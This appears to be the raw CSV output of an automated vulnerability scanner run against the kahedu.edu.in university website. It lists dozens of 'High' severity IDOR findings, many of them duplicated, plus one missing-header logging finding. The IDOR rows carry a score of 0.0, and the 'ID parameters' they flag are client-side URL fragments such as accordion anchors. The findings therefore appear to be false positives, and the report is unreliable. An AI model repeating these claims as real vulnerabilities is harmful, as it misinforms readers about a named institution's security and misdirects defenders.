Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-chemistry/#1574016447632-86c3ad7e-821a,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/#1766380451891-81b69633-48bb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#1574018027979-2bc18f3d-e0c7,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#1574018027979-2bc18f3d-e0c7,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#1767345372846-1e66b7d6-7bc1,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-commerce/#1574017975212-eafa706d-27bf,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730083756-315babee-cf3c,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730083756-315babee-cf3c,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730016965-aa2ff1de-a93c,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730016965-aa2ff1de-a93c,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1723439930290-ced31204-1eeb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730084796-c43df41a-e2af,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730797773-536512d5-02b9,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/administration/iqac/#1573730797773-536512d5-02b9,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574018027979-2bc18f3d-e0c7,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574017975212-eafa706d-27bf,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574017975212-eafa706d-27bf,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/placement/training-and-placement-cell/#1573891811578-ded78a7f-ac37,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016447632-86c3ad7e-821a,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/#1574016447632-86c3ad7e-821a,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/placement/training-and-placement-cell/#1692344854022-a319a3ad-de80,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/placement/training-and-placement-cell/#1573891811595-5766f071-5c32,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/placement/training-and-placement-cell/#1573891811595-5766f071-5c32,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016421198-a00647ae-15e3,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016447632-86c3ad7e-821a,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574017975212-eafa706d-27bf,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574017975212-eafa706d-27bf,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574016421299-0f63f841-e7fb,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574018027979-2bc18f3d-e0c7,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/computer-science-engineering/#1574018027979-2bc18f3d-e0c7,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574016446128-383c784a-e794,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574018027979-2bc18f3d-e0c7,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Insecure Direct Object Reference (IDOR),High,0.0,URL Path (ID Parameter),https://kahedu.edu.in/academics/engineering/electrical-electronics-engineering/#1574018027979-2bc18f3d-e0c7,Attacker can access unauthorized data by modifying ID parameters.,Implement proper authorization checks before granting access to resources.
Logging Failure,Low,0.0,HTTP Response Header,Missing X-Request-ID/X-Correlation-ID,Lack of request correlation identifiers makes incident response and forensic analysis difficult (A09).,Implement centralized logging with unique request identifiers (e.g. UUIDs) for all transactions.
